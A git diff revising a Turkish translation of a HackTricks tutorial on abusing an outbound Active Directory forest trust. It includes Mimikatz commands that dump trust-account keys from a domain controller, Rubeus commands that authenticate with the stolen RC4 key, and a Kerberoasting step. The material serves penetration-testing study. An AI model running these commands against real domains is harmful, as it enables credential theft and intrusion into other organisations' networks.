@@ -1,24 +1,24 @@
-# Dış Orman Alanı - Tek Yönlü (Dışarıya Doğru)
+# Dış Orman Etki Alanı - Tek Yönlü (Dışa Doğru)
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
-* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* Şirketinizin **HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
-Bu senaryoda **alanınız**, **farklı alanlardan** birincil bir **özneye bazı ayrıcalıklar** sağlamaktadır.
+Bu senaryoda **etki alanınız**, **farklı etki alanlarından** bir **ilkeye bazı ayrıcalıklar** güvenmektedir.
 
-## Sorgulama
+## Numaralandırma
 
-### Dışarıya Doğru Güven
+### Dışa Doğru Güven
 ```powershell
 # Notice Outbound trust
 Get-DomainTrust
@@ -42,41 +42,41 @@ MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=F
 ```
 ## Güvenlik Hesabı Saldırısı
 
-Bir güven ilişkisi kurulduğunda, burada **A** alanı ve **B** alanı olarak tanımlanan iki alan arasında bir güven ilişkisi kurulduğunda bir güvenlik açığı mevcuttur. Bu yapıda, **B** alanı, **A** alanına güvenini genişletirken, iki alan arasındaki kimlik doğrulama sürecinde önemli bir rol oynayan **A** alanında **B** alanı için özel bir hesap oluşturulur. Bu hesap, alanlar arasında hizmetlere erişmek için biletleri şifrelemek için kullanılır.
+İki alan arasında bir güven ilişkisi kurulduğunda, burada alan **A** ve alan **B** olarak tanımlanan iki alan arasında bir güven ilişkisi kurulduğunda bir güvenlik açığı mevcuttur. Bu yapılandırmada, alan **B**, güvenini alan **A**'ya genişletir. Bu kurulumda, alan **A**'da alan **B** için özel bir hesap oluşturulur ve bu hesap, iki alan arasındaki kimlik doğrulama sürecinde kritik bir rol oynar. Alan **B** ile ilişkilendirilen bu hesap, alanlar arasında hizmetlere erişmek için biletleri şifrelemek için kullanılır.
 
-Burada anlaşılması gereken kritik nokta, bu özel hesabın parolasının ve karmasının, **A** alanındaki bir Etki Alanı Denetleyicisinden bir komut satırı aracı kullanılarak çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut:
+Burada anlaşılması gereken kritik nokta, bu özel hesabın şifresinin ve karmasının bir Komut Satırı aracı kullanılarak alan **A**'daki bir Alan Denetleyicisinden çıkarılabileceğidir. Bu işlemi gerçekleştirmek için kullanılan komut:
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-Bu çıkarım, hesabın adının ardından **$** ile belirlendiği için mümkündür ve bu hesap, "Domain Users" grubuna aittir ve dolayısıyla bu grupla ilişkili izinleri devralır. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak etki alanı **A**'ya karşı kimlik doğrulaması yapmasına olanak tanır.
+Bu çıkarma, adının ardından **$** ile tanımlanan hesabın etkin ve domain **A**'nın "Domain Kullanıcıları" grubuna ait olması nedeniyle mümkündür, bu da bu grubun izinleriyle ilişkilendirilmiş izinlerin devralınmasını sağlar. Bu, bireylerin bu hesabın kimlik bilgilerini kullanarak domain **A**'ya karşı kimlik doğrulaması yapmasına olanak tanır.
 
-**Uyarı:** Bu durumu kullanarak sınırlı izinlere sahip bir kullanıcı olarak etki alanı **A**'da bir dayanak noktası elde etmek mümkündür. Ancak, bu erişim, etki alanı **A** üzerinde numaralandırma yapmak için yeterlidir.
+**Uyarı:** Bu durumu kullanarak domain **A**'da sınırlı izinlerle bir kullanıcı olarak bir başlangıç noktası elde etmek mümkündür. Ancak, bu erişim, domain **A** üzerinde numaralandırma yapmak için yeterlidir.
 
-`ext.local`'in güvenen etki alanı ve `root.local`'in güvenilen etki alanı olduğu bir senaryoda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulur. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek `root.local` içindeki `EXT$` hesabının kimlik bilgileri ortaya çıkarılabilir. Bunu başarmak için kullanılacak komut:
+Güvenen domain'in `ext.local` ve güvenilen domain'in `root.local` olduğu bir senaryoda, `root.local` içinde `EXT$` adında bir kullanıcı hesabı oluşturulacaktır. Belirli araçlar aracılığıyla, Kerberos güven anahtarlarını dökerek `root.local` içindeki `EXT$` kimlik bilgilerini ortaya çıkarmak mümkündür. Bunu başarmak için kullanılacak komut:
 ```bash
 lsadump::trust /patch
 ```
-Ardından, başka bir araç komutunu kullanarak, çıkarılan RC4 anahtarını kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulaması yapılabilir:
+Ardından, çıkarılan RC4 anahtarını kullanarak başka bir araç komutunu kullanarak `root.local` içinde `root.local\EXT$` olarak kimlik doğrulaması yapılabilir:
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-Bu kimlik doğrulama adımı, `root.local` içindeki hizmetleri sıralamak ve hatta sömürmek için olanak sağlar. Örneğin, Kerberoast saldırısı kullanarak hizmet hesabı kimlik bilgilerini çıkarmak mümkündür. Bunun için aşağıdaki komutu kullanabilirsiniz:
+Bu kimlik doğrulama adımı, `root.local` içinde hizmet hesabı kimlik bilgilerini çıkarmak için Kerberoast saldırısı gerçekleştirme gibi hizmetleri numaralandırma ve hatta istismar olasılığını açar:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-### Açık metin güven parolası toplama
+### Açık metin güven şifresi toplama
 
-Önceki akışta, **açık metin parola** yerine (aynı zamanda mimikatz ile **dökülen**) güven hash'i kullanıldı.
+Önceki akışta, **açık metin şifresi** (ayrıca **mimikatz ile dump edilen**) yerine güven hash'i kullanıldı.
 
-Açık metin parolası, mimikatz'den \[ CLEAR ] çıktısını onaltılıktan dönüştürerek ve null baytları '\x00' kaldırarak elde edilebilir:
+Açık metin şifresi, mimikatz'den gelen \[ CLEAR ] çıktısının onaltılıktan dönüştürülerek ve ' \x00 ' null baytları çıkarılarak elde edilebilir:
 
-![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)
+![](<../../.gitbook/assets/image (935).png>)
 
-Bazen bir güven ilişkisi oluşturulurken, güven için kullanıcı tarafından bir parola yazılması gerekebilir. Bu gösterimde, anahtar orijinal güven parolasıdır ve bu nedenle insan tarafından okunabilir. Anahtar döngüsü (30 gün) olduğunda, açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir olacaktır.
+Bazen bir güven ilişkisi oluşturulurken, güven için kullanıcı tarafından bir şifre yazılması gerekebilir. Bu gösterimde, anahtar orijinal güven şifresidir ve dolayısıyla insan tarafından okunabilir. Anahtar döngüsü (30 gün) olduğunda, açık metin insan tarafından okunabilir olmayacak ancak teknik olarak hala kullanılabilir olacaktır.
 
-Açık metin parolası, güven hesabının Kerberos gizli anahtarını kullanarak TGT istemek yerine güven hesabının kimlik doğrulamasını gerçekleştirmek için kullanılabilir. Burada, ext.local'dan root.local'e Domain Admins üyelerini sorgulama:
+Açık metin şifresi, güven hesabının Kerberos gizli anahtarını kullanarak TGT istemek yerine güven hesabı olarak düzenli kimlik doğrulaması yapmak için kullanılabilir. Burada, ext.local'den root.local'a Domain Yöneticileri üyeleri için sorgulama yapılıyor:
 
-![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)
+![](<../../.gitbook/assets/image (789).png>)
 
 ## Referanslar
 
@@ -84,14 +84,14 @@ Açık metin parolası, güven hesabının Kerberos gizli anahtarını kullanara
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricks'i desteklemenin diğer yolları:
+HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
+* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.
+* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
